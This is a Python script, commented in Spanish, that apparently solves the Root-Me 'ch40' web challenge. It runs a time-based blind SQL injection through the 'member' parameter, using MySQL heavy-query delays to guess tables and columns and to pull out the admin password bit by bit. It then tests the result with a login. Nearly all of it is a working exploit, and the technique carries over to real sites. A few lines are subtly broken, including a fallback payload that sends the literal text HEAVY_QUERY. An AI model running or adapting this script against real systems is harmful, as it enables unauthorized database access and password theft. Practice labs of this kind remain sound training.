import requests
import time
import sys
import urllib.parse

# CONFIGURACIÓN
URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}  # Usa tu cookie actual

# Heavy Query para MySQL 5 (la que vimos en el PDF)
HEAVY_QUERY = "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2)"

# Umbral de tiempo (ajustar según pruebas)
UMBRAL = 3  # Empezamos con 3 segundos

def is_true(payload):
    """Ejecuta la inyección y retorna True si hay retardo"""
    # Construimos la URL con el payload
    full_payload = f"1 AND {payload}"
    params = {
        "action": "member",
        "member": full_payload
    }
    
    try:
        inicio = time.time()
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        print(f"  [DEBUG] Tiempo: {tiempo:.2f}s - {payload[:60]}...")
        return tiempo > UMBRAL
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False

def find_table():
    """Encuentra la tabla que contiene los usuarios"""
    print("[*] Buscando tabla de usuarios...")
    tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores']
    
    for tabla in tablas:
        payload = f"IF(EXISTS(SELECT * FROM {tabla}), {HEAVY_QUERY}, 0)"
        print(f"  Probando tabla: {tabla}")
        if is_true(payload):
            print(f"[+] ¡Tabla encontrada! -> {tabla}")
            return tabla
        time.sleep(0.5)
    
    # Si no encontramos, intentamos con el nombre del admin
    print("[*] Probando con 'admin' como tabla...")
    if is_true("IF(EXISTS(SELECT * FROM admin), HEAVY_QUERY, 0)"):
        return "admin"
    
    print("[-] No se encontró ninguna tabla.")
    return None

def find_columns(tabla):
    """Encuentra las columnas de usuario y contraseña"""
    print(f"[*] Buscando columnas en {tabla}...")
    
    # Primero, encontramos la columna de usuario
    columnas_user = ['username', 'user', 'login', 'name', 'admin']
    columna_user = None
    
    for col in columnas_user:
        payload = f"IF(EXISTS(SELECT {col} FROM {tabla} WHERE id=1), {HEAVY_QUERY}, 0)"
        print(f"  Probando columna usuario: {col}")
        if is_true(payload):
            print(f"[+] Columna de usuario encontrada: {col}")
            columna_user = col
            break
        time.sleep(0.5)
    
    if not columna_user:
        print("[-] No se encontró columna de usuario")
        return None, None
    
    # Ahora, encontramos la columna de contraseña
    columnas_pass = ['password', 'pass', 'clave', 'pwd']
    columna_pass = None
    
    for col in columnas_pass:
        payload = f"IF(EXISTS(SELECT {col} FROM {tabla} WHERE id=1), {HEAVY_QUERY}, 0)"
        print(f"  Probando columna contraseña: {col}")
        if is_true(payload):
            print(f"[+] Columna de contraseña encontrada: {col}")
            columna_pass = col
            break
        time.sleep(0.5)
    
    return columna_user, columna_pass

def get_password_length(tabla, columna_pass):
    """Obtiene la longitud de la contraseña del admin"""
    print(f"[*] Obteniendo longitud de la contraseña...")
    
    # Primero probamos longitudes comunes
    for i in range(1, 50):
        payload = f"IF((SELECT LENGTH({columna_pass}) FROM {tabla} WHERE id=1) = {i}, {HEAVY_QUERY}, 0)"
        print(f"  Probando longitud: {i}")
        if is_true(payload):
            print(f"[+] Longitud: {i}")
            return i
        time.sleep(0.3)
    
    return None

def extract_char(tabla, columna_pass, pos):
    """Extrae un carácter usando comparación ASCII (más fiable)"""
    # Probamos rangos comunes: letras minúsculas, mayúsculas, números y símbolos
    rangos = [
        (48, 57),   # 0-9
        (65, 90),   # A-Z
        (97, 122),  # a-z
        (33, 47),   # Símbolos !"#$%&'()*+,-./
        (58, 64),   # Símbolos :;<=>?@
        (91, 96),   # Símbolos [\]^_`
        (123, 126)  # Símbolos {|}~
    ]
    
    for inicio, fin in rangos:
        for ascii_val in range(inicio, fin + 1):
            payload = f"IF(ASCII(SUBSTRING((SELECT {columna_pass} FROM {tabla} WHERE id=1), {pos}, 1)) = {ascii_val}, {HEAVY_QUERY}, 0)"
            print(f"    Probando ASCII: {ascii_val} ({chr(ascii_val)})")
            if is_true(payload):
                return chr(ascii_val)
            time.sleep(0.2)
    
    return None

def extract_char_bit(tabla, columna_pass, pos):
    """Extrae un carácter usando método bit a bit (más rápido)"""
    valor = 0
    for bit in range(8):
        potencia = 2 ** bit
        payload = f"IF(ASCII(SUBSTRING((SELECT {columna_pass} FROM {tabla} WHERE id=1), {pos}, 1)) & {potencia}, {HEAVY_QUERY}, 0)"
        if is_true(payload):
            valor |= potencia
        time.sleep(0.2)
    
    return chr(valor)

def verify_password(tabla, columna_pass, password):
    """Verifica que la contraseña encontrada es correcta"""
    print("[*] Verificando contraseña...")
    
    # Probamos login con la contraseña encontrada
    login_data = {
        "username": "admin",
        "password": password
    }
    
    try:
        r = requests.post(f"{URL}?action=login", data=login_data, cookies=COOKIE)
        if "Authentification error" not in r.text:
            print("[+] ¡Contraseña verificada correctamente!")
            return True
        else:
            print("[-] La contraseña no funciona en el login")
            return False
    except Exception as e:
        print(f"[ERROR] {e}")
        return False

def main():
    print("="*60)
    print("  TIME-BASED SQL INJECTION - ROOT-ME CH40")
    print("  Recuperando contraseña del admin")
    print("="*60)
    
    # Paso 1: Encontrar la tabla
    tabla = find_table()
    if not tabla:
        print("[-] No se pudo encontrar la tabla. Saliendo...")
        sys.exit(1)
    
    # Paso 2: Encontrar las columnas
    col_user, col_pass = find_columns(tabla)
    if not col_user or not col_pass:
        print("[-] No se pudieron encontrar las columnas. Saliendo...")
        sys.exit(1)
    
    # Paso 3: Obtener longitud de la contraseña
    longitud = get_password_length(tabla, col_pass)
    if not longitud:
        print("[-] No se pudo obtener la longitud. Saliendo...")
        sys.exit(1)
    
    # Paso 4: Extraer la contraseña
    print(f"\n[*] Extrayendo contraseña de {longitud} caracteres...")
    password = ""
    
    # Primero intentamos con método bit a bit (más rápido)
    for pos in range(1, longitud + 1):
        print(f"\n  [*] Posición {pos}/{longitud}...")
        char = extract_char_bit(tabla, col_pass, pos)
        password += char
        print(f"  [+] Carácter: '{char}' (ASCII: {ord(char)})")
        print(f"  [*] Progreso: {password}")
    
    print("\n" + "="*60)
    print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
    print("="*60)
    
    # Paso 5: Verificar la contraseña
    if verify_password(tabla, col_pass, password):
        print("[+] ¡Éxito! Puedes iniciar sesión con admin:{password}")
    else:
        print("[!] La contraseña parece incorrecta. Probando método alternativo...")
        # Si falla, intentamos con comparación directa
        password = ""
        for pos in range(1, longitud + 1):
            print(f"\n  [*] Posición {pos}/{longitud} (método directo)...")
            char = extract_char(tabla, col_pass, pos)
            if char:
                password += char
                print(f"  [+] Carácter: '{char}' (ASCII: {ord(char)})")
                print(f"  [*] Progreso: {password}")
            else:
                print(f"  [!] No se pudo extraer el carácter {pos}")
        
        print("\n" + "="*60)
        print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
        print("="*60)

if __name__ == "__main__":
    main()
